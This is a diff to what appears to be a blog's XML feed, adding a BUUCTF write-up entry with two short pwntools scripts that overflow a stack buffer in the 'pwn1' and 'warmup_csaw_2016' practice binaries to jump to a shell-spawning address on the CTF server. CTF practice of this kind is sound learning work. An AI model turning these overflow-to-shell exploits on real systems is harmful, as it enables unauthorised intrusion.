@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>Buuctf 解题</title>
+      <link href="/2022/01/12/buuctf/"/>
+      <url>/2022/01/12/buuctf/</url>
+      
+        <content type="html"><![CDATA[<ol><li><p>pwn1</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *log_level = 'debug'elf = ELF("./pwn1")local = 0if local:   r = process("./pwn1")else:   r = remote("node4.buuoj.cn",29317)bin_sh = 0x000000000040118Asystem_addr = 0x0000000000401191payload = b'a'*0x0F + p64(system_addr) + p64(bin_sh)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>warmup_csaw_2016</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os='linux',arch= 'amd64',log_level='debug')elf = ELF("./warmup")local = 0if local:    r = process("./warmup")else:    r = remote("node4.buuoj.cn",29230)addr = 0x000000000040060epayload = b'a'*72 + p64(addr)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 简单wp </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>ret2libc3</title>
       <link href="/2022/01/12/ret2libc3/"/>
       <url>/2022/01/12/ret2libc3/</url>
